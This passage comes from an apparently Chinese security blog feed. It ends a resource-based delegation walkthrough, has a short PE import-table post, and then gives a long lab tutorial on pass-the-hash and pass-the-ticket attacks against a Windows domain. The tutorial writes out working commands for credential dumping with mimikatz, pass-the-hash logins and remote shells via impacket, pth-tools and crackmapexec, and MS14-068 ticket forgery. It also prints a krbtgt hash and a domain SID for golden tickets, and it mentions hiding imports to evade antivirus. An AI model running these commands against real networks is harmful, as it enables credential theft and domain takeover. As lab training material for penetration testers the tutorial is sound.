<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hacker -p hacker -t PC2 -a 192.168.93.30 whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223625113.png" class title="image-20220318223625113">

<p>可以看到确实生成了用户</p>
<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223702223.png" class title="image-20220318223702223">



<p>获得服务票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.93.30 whoamianony/hacker\$:hacker -spn cifs/PC2.whoamianony.org -impersonate administrator</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318224914156.png" class title="image-20220318224914156">

<p>将票据导入内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>



<p>直接连接目标机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k PC2.whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318232610317.png" class title="image-20220318232610317">

<p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
<p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>导入表结构解析</title>
    <url>/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="导入表解析"><a href="#导入表解析" class="headerlink" title="导入表解析"></a>导入表解析</h1><p>导入表就是记录PE程序从外部导入动态链接库的东西。他只起一个引导的作用。</p>
<p>使用LordPE先查看导入表的一些基本信息，可以看到每一个动态链接库都调用了很多api</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325162801268.png" class title="image-20220325162801268">



<p>查看三个与导入表相关的结构（解析主要在图片里面的注释）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR</span><br><span class="line">IMAGE_THUNK_DATA</span><br><span class="line">IMAGE_IMPORT_BY_NAME</span><br></pre></td></tr></table></figure>



<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325163835784.png" class title="image-20220325163835784">

<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325170815048.png" class title="image-20220325170815048">



<p>结构理清楚过后就写代码来解析</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180456376.png" class title="image-20220325180456376">

<p>这里还要在主函数之中调用一下</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180527792.png" class title="image-20220325180527792">



<p>可以看到返回了我们想要的结果，把导入表进行了遍历</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180651925.png" class title="image-20220325180651925">



<p>导入表的上半部分导入表的相关信息已经解析成功了，现在解析下半部分的api函数部分</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325180821535.png" class title="image-20220325180821535">



<p>还是通过写函数来解析</p>
<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183239217.png" class title="image-20220325183239217">

<img data-src="/2022/03/25/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20220325183508506.png" class title="image-20220325183508506">

<p>可以看到是成功解析了的，并且顺序也没有问题，这就是一个基本的导入表的分析</p>
<p>总结：导入表的大小主要取决于写代码的时候导入了多少动态链接库，就会在导入表这里显示导入了多少动态链接库，导入了多少函数。如果正常程序调用了太多dll可能会引起误报，所以做免杀的时候可以将导入表不显示。例如可以写壳等方式。</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析域渗透的pth&amp;ptt&amp;ptk</title>
    <url>/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/</url>
    <content><![CDATA[<p>一直对这一块知识有点知其然不知其所以然的感觉，所以这里总结一下关于这三种手法的原理及其利用。文章是以红日7的靶机作为域环境来进行的实验，域成员为192.168.93.20，域控为192.168.93.30，纯粹为了方便。。。</p>
<h1 id="PTH：Pass-The-Hash（Hash传递攻击）"><a href="#PTH：Pass-The-Hash（Hash传递攻击）" class="headerlink" title="PTH：Pass The Hash（Hash传递攻击）"></a>PTH：Pass The Hash（Hash传递攻击）</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>什么是LM Hash？什么是NTLM Hash？和pth有什么关系？</p>
<p>LM Hash(LAN Manager Hash)：当windows用户设置密码后，会生成一个Hash值，windows会把这个Hash值保存到c:\windows\system32\config\sam，文件中，Lm Hash也就是生成这个Hash值的一种单向散列函数，所以我们登录计算机输入密码的时候，计算机不会把我们的明文密码拿去和保存的密码比对，而是将我们输入的密码的Hash值拿去比对，如果Hash值相同，才能登陆成功。</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307143037621.png" class title="image-20220307143037621">

<p>LM Hash 的脆弱性：</p>
<p>1、密码长度限制为从95个ASCII可打印字符中最多选择14个，也就是密码的最长长度为14位</p>
<p>2、密码不区分大小写。在生成哈希值之前，所有密码都被转换为大写。因此 LM 哈希将 PassWord、password、PaSsWoRd、PASSword 和其他类似的组合视为 PASSWORD。这样的设计无疑极大的降低了爆破的难度，更容易进行Hash碰撞。</p>
<p>3、 14 个字符的密码被分成 7+7 个字符，并分别计算每一半的哈希值。也就是可以把一个密码分成两次爆破，又降低了爆破难度。</p>
<p>4、如果密码长度小于等于7，则哈希的后半部分将始终产生相同的常量值 (0xAAD3B435B51404EE)。这就让攻击者很容易识别密码的大概长度。</p>
<p>5、Hash值在不加盐的情况下发送到网络服务器，易受到中间人攻击，例如Hash重放。（加盐就是在你生成密码后，随机生成一个字符串加到你密码后面进行Hash，这样就算是相同的密码，Hash也是不同的，至于中间人攻击属于密码学范畴，这里不再赘述了）</p>
<p>LM与NTLM之间的关系</p>
<p>许多传统的第三方SMB花费了相当长的时间来添加对 Microsoft 创建的用于替换 LM 哈希的更强大协议的支持，因为支持这些库的社区首先必须对较新的协议进行SAMBA花了 5 年时间来添加NTLMv2支持，而JCIFS花了 10 年。也就是LM Hash使用范围太广了，本着向后兼容的原因，还在使用LM Hash进行存储</p>
<p>NTML(NT Lan Manager)：网上有博主说NTML就是NT hash，其实这样说是不严谨的，在我查阅microsoft的官方文档后发现其实NTLM、NTLMv2 和 Kerberos 都使用 NT hash，也称为 Unicode 哈希。所以，应该叫使用NT hash这种方法，而NTML是一种安全协议。注意NTML和Kerberos（以后会发文详解Kerberos）是两种协议，NTML的认证过程更简单，自然也比Kerberos更易受到攻击。但也是plus版本的LM Hash。</p>
<p>简单说一下NTML的认证过程：</p>
<p>1、用户输入username、password、domainname（交互式才需要这个步骤），客户端会计算hash值保存在本地</p>
<p>2、客户端将username明文发给DC</p>
<p>3、DC生成一个16Byte的随机数（challenge）发送给客户端</p>
<p>4、户端通过运算生成一个响应值response&#x3D;f(hashes,challenge,other)&#x3D;&gt;other根据版本变化，例如时间戳来防止回访等</p>
<p>5、客户端将响应值发送给DC</p>
<p>6、DC经过同样的运算result &#x3D; f(hashes,challenge,other)，然后比较result和response，一直就验证通过，不一致则验证不通过</p>
<p>7、备注：目标不一定是DC，hash对应的账号所登录的（有缓存的）工作站也可以。</p>
<p>NTLM 协议使用两个散列密码值中的一个或两个，这两个值也都存储在服务器（或域控制器）上，并且由于没有加盐它们是密码等效的，这意味着如果你从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。（这就是为什么dumphash后可以不用进行hash碰撞就能就行身份验证）</p>
<p>NTML就很安全吗？</p>
<p>自 2010 年起，微软就不再推荐在应用程序中使用 NTLM，因为NTML不支持最新的加密方式比如（AES 或 SHA-256），它使用的是MD4加密。</p>
<p>NTML的脆弱性：</p>
<p>1、易受hash传递攻击，在许多情况下， msf可用于从一台机器获取凭据，该凭据可用于控制另一台机器。 Squirtle 工具包可用于利用网站跨站点脚本xss攻击通过 NTLM 对附近资产进行攻击。</p>
<p>2、每一个可能的 8 字符 NTLM 密码哈希排列都可以在 3 小时内被破解。也就是密码短的NTML加密密码很容易被暴力破解。</p>
<h2 id="PTH攻击的原理及条件"><a href="#PTH攻击的原理及条件" class="headerlink" title="PTH攻击的原理及条件"></a>PTH攻击的原理及条件</h2><p>原理：本机 Windows 应用程序要求用户提供明文密码，然后调用LsaLogonUser之类的API，将密码转换为一个或两个哈希值（LM 或 NT 哈希），然后在 NTLM 身份验证期间将其发送到远程服务器。对该机制的分析表明，成功完成网络身份认证不需要明文密码，只需要哈希。<strong>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</strong></p>
<p>利用条件：</p>
<ul>
<li>域&#x2F;工作组环境</li>
<li>可以获得hash，但是条件不允许对hash爆破</li>
<li>网中存在和当前机器相同的密码</li>
</ul>
<h2 id="PTH的各种攻击手法"><a href="#PTH的各种攻击手法" class="headerlink" title="PTH的各种攻击手法"></a>PTH的各种攻击手法</h2><h3 id="一、mimikatz"><a href="#一、mimikatz" class="headerlink" title="一、mimikatz"></a>一、mimikatz</h3><p>mimikatz的pth功能需要本地管理员权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307174851960.png" class title="image-20220307174851960">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175035435.png" class title="image-20220307175035435">

<p>可以看到这里LM 和 NTML都使用了，这里只研究NTML，复制NTML Hash的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:administrator /domain:WHOAMIANONY /ntlm:ab89b1295e69d353dd7614c7a3a80cec &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<p>也可以使用此命令顺便打开对方的3389，这里只使用第一种</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307175628272.png" class title="image-20220307175628272">

<p>看域成员机已经自动打开了一个administrator权限的cmd，这时连接域控192.168.93.30就不需要密码了</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307181533555.png" class title="image-20220307181533555">

<p>mimikatz的pass the hash成功</p>
<h3 id="二、msf的pth"><a href="#二、msf的pth" class="headerlink" title="二、msf的pth"></a>二、msf的pth</h3><p>msf内置有dumphash的模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/hashdump</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201432638.png" class title="image-20220307201432638">

<p>使用抓到的Hash登陆</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220307201809777.png" class title="image-20220307201809777">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308171935823.png" class title="image-20220308171935823">

<p>这里有坑，一定要把LM Hash的值全部替换成0，试了非常久，虽然抓到了LM Hash但是直接用LM Hash:NTML Hash或者只用NTML Hash都会提示身份认证有误，要把LM Hash的值改为0就没问题，我看网上博主有直接用NTML Hash的也可以成功，这里具体的原因我也不太懂。</p>
<h3 id="三、impacket工具包"><a href="#三、impacket工具包" class="headerlink" title="三、impacket工具包"></a>三、impacket工具包</h3><p>smbclient.py插件，这里的32个0是LM Hash的值，随便写什么都可以，因为windows 2012过后默认关闭LM Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbclient.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec WHOAMIANONY/Administrator@192.168.93.30</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308091716872.png" class title="image-20220308091716872">



<p>smbexec.py插件使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -hashes 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec Administrator@192.168.93.30</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308092612807.png" class title="image-20220308092612807">



<p>psexec.py插件使用</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093101883.png" class title="image-20220308093101883">



<p>wmiexec.py使用</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308093949487.png" class title="image-20220308093949487">

<p>impacket包中还有其他脚本（eg：<em>rpcdump.py</em>）也可以用来对smb进行攻击，使用方法大同小异，这里就不演示了</p>
<h3 id="四、PTH工具包"><a href="#四、PTH工具包" class="headerlink" title="四、PTH工具包"></a>四、PTH工具包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-smbclient -U WHOAMIANONY/administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec //192.168.93.30/c$</span><br></pre></td></tr></table></figure>

<p>针对smb服务</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308094634025.png" class title="image-20220308094634025">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-rpcclient -U WHOAMIANONY/administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec //192.168.93.30</span><br></pre></td></tr></table></figure>

<p>针对rpc服务执行rpc命令</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095055606.png" class title="image-20220308095055606">



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pth-winexe -U WHOAMIANONY/administrator%00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec //192.168.93.30 cmd.exe</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095431637.png" class title="image-20220308095431637">

<p>与impacket工具包差不多，这里也有其他模块可以利用抓到的hash进行攻击，这里就不再演示了。</p>
<h3 id="五、Crackmapexec"><a href="#五、Crackmapexec" class="headerlink" title="五、Crackmapexec"></a>五、Crackmapexec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.93.30 -u administrator -H ab89b1295e69d353dd7614c7a3a80cec -x whoami</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308095928239.png" class title="image-20220308095928239">



<h1 id="PTT：Pass-The-Ticket（Hash票据传递）"><a href="#PTT：Pass-The-Ticket（Hash票据传递）" class="headerlink" title="PTT：Pass The Ticket（Hash票据传递）"></a>PTT：Pass The Ticket（Hash票据传递）</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><p>经典三连</p>
<p>什么是黄金票据白银票据？他们有什么用？kerberos又是什么？</p>
<p>首先先了解一下kerberos协议的认证过程（网上关于kerberos的详细解析非常多，这里就简单理一下）：客户端向**认证服务器 (AS)<strong>认证自己，认证服务器将用户名转发到</strong>密钥分发中心 **(KDC)<strong>。KDC 发出一个</strong>票据授予票据 (TGT)<strong>，该票据带有时间戳，并使用</strong>票据授予服务 (TGS)**的密钥对其进行加密，并将加密的结果返回给用户的工作站。这很少发生，通常是在用户登录时；TGT 会在某个时候过期，尽管它可能会在用户登录时由用户的会话管理器透明地更新。</p>
<p><a href="https://www.cnblogs.com/artech/archive/2007/07/05/807492.html">https://www.cnblogs.com/artech/archive/2007/07/05/807492.html</a></p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112450743.png" class title="image-20220308112450743">



<p>什么是黄金票据？</p>
<p>Golden Tickets 是伪造的 Ticket-Granting Tickets (TGT)，也称为身份验证票。可以访问域控，需要有域控的权限，拿到金票后域控更改密码也可以进行登陆。</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112603791.png" class title="image-20220308112603791">



<p>什么是白银票据？</p>
<p>银票是伪造的 Ticket Granting Service 票，也称为服务票。不可以访问域控，只能针对特定的服务进行访问，但是获取更容易，不需要任何特权账户，更隐秘。</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308112720029.png" class title="image-20220308112720029">

<h2 id="PTT攻击的原理及条件"><a href="#PTT攻击的原理及条件" class="headerlink" title="PTT攻击的原理及条件"></a>PTT攻击的原理及条件</h2><p>黄金票据：主要用于做拿到域控后的权限维持，因为拿下了域控，所以能够抓到域内所有用户的Hash，因此利用krbtgt的Hash值可以伪造TGT，让某一普通用户成为域管理员</p>
<p>条件：</p>
<ul>
<li>krbtgt用户的hash</li>
<li>域名称</li>
<li>域的SID值</li>
<li>要伪造的用户名</li>
</ul>
<p>白银票据：白银票据是有效的TGS票据因为它是由为运行 Kerberos 身份验证服务的每个服务器配置的服务主体名称的服务帐户加密&#x2F;签名的。也就是说白银票据是由服务帐户（从计算机的本地 SAM 或服务帐户凭证提取的计算机帐户凭证）加密&#x2F;签名的。而且TGS没有与之关联的TGT也就是不会与域控直接联系，因此可以冒充域控对服务进行访问。</p>
<p>条件：</p>
<ul>
<li>域名，域sid</li>
<li>目标服务器名，目标服务器的服务</li>
<li>服务账号的NTML HASH </li>
<li>需要伪造的用户名</li>
</ul>
<p>两者最大的不同就是，黄金票据由krbtgt 的NTML Hash加密，白银票据由服务账号的NTML Hash加密</p>
<h2 id="PTT的各种攻击手法"><a href="#PTT的各种攻击手法" class="headerlink" title="PTT的各种攻击手法"></a>PTT的各种攻击手法</h2><h3 id="一、MS14-068"><a href="#一、MS14-068" class="headerlink" title="一、MS14-068"></a>一、MS14-068</h3><p>现在是普通的域成员的管理员权限，这里要注意执行域命令的话要使用在域中存在的账户，而system权限的账户whoami可以发现不在域中，所以这里一定要使用administrator权限的账户</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143024538.png" class title="image-20220308143024538">



<p>查看当前计算机名和域</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308143635556.png" class title="image-20220308143635556">



<p>msf的自带模块可以定位域控及域主机名</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308145841037.png" class title="image-20220308145841037">



<p>抓取Hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150050482.png" class title="image-20220308150050482">

<p>发现有个域用户的账号密码用户名为administrator</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308150718073.png" class title="image-20220308150718073">





<p>现在是无法访问域控的c盘的（正确命令应该是dir \\DC.WHOAMIANONY.ORG\c$或者dir \\DC\c$，这里故意做没有凭据时的错误回显，演示用）</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151507846.png" class title="image-20220308151507846">



<p>查看已控制的域用户的SID</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308151818577.png" class title="image-20220308151818577">



<p>使用ms14-068，域控地址可以是ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152102520.png" class title="image-20220308152102520">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152322309.png" class title="image-20220308152322309">



<p>mimikatz清空之前缓存的凭证，导入伪造的凭证</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308152451407.png" class title="image-20220308152451407">



<p>已经有域管的权限</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308153659219.png" class title="image-20220308153659219">

<h3 id="二、kekeo"><a href="#二、kekeo" class="headerlink" title="二、kekeo"></a>二、kekeo</h3><p><a href="https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718">https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit::ms14068 /domain:whoamianony.org /user:administrator /password:Whoami2021 /ptt</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155430200.png" class title="image-20220308155430200">

<p>这里我不知道为什么kali执行 dir \\DC\c$会报错，但是在win7本机确实可以访问，具体原因我不太明白</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308155551146.png" class title="image-20220308155551146">

<h3 id="三、goldenpac"><a href="#三、goldenpac" class="headerlink" title="三、goldenpac"></a>三、goldenpac</h3><p>可以使用impacket包中的goldenpac脚本，直接获得一个system的cmd</p>
<p>需要在kali安装kerberos认证功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install krb5-user</span><br></pre></td></tr></table></figure>

<p>但是我使用此模块并没有成功弹回system的cmd。。。。。。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 goldenPac.py -dc-ip 192.168.93.30 -target-ip 192.168.93.20 whoamianony.org/administrator:Whoami2021@DC.whoamianony.org</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308162840622.png" class title="image-20220308162840622">

<h3 id="四、使用msf的模块"><a href="#四、使用msf的模块" class="headerlink" title="四、使用msf的模块"></a>四、使用msf的模块</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure>

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163401831.png" class title="image-20220308163401831">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308163727221.png" class title="image-20220308163727221">

<p>在&#x2F;root&#x2F;.msf4&#x2F;loot文件夹下会生成一个文件，需要用mimikatz进行格式转换（生成的文件与mimikatz在同一目录下）</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165539270.png" class title="image-20220308165539270">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308165504698.png" class title="image-20220308165504698">



<p>将生成的票据拷贝回kali，通过kiwi模块导入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0-00000000-administrator@krbtgt-WHOAMIANONY.ORG.kirbi</span><br></pre></td></tr></table></figure>

<p>这个地方导入的时候又出现了错误。。我查阅很多资料发现其他博主也会导入不成功，目前我还是没弄懂原因</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308170058648.png" class title="image-20220308170058648">

<p>如果导入成功可以使用 msf的模块进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit/windows/local/current_user_psexecset</span><br></pre></td></tr></table></figure>



<h3 id="五、制作黄金票据"><a href="#五、制作黄金票据" class="headerlink" title="五、制作黄金票据"></a>五、制作黄金票据</h3><p><strong>mimikatz制作</strong></p>
<p>使用mimikatz来抓取DC的Krbtgt用户的密码Hash，已经拿下域控的条件下，做权限维持用</p>
<p>在DC下使用mimikatz抓到了Krbtgt用户的密码Hash，此时DC被修改密码，我们控制的还有一台普通域用户的shell</p>
<p>在域控下抓到的Hash</p>
<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172118232.png" class title="image-20220308172118232">

<img data-src="/2022/03/06/%E6%B5%85%E6%9E%90%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9A%84pth-ptt-ptk/image-20220308172141266.png" class title="image-20220308172141266">

<p>满足前三点制作黄金票据的条件：</p>
<p>1、域的SID S-1-5-21-1315137663-3706837544-1429009142 </p>
<p>2、域的名称 WHOAMIANONY</p>
<p>3、krbtgt的hash 6be58bfcc0a164af2408d1d3bd313c2a</p>
<p>4、伪造任意用户名</p>
<p>制作黄金票据</p>
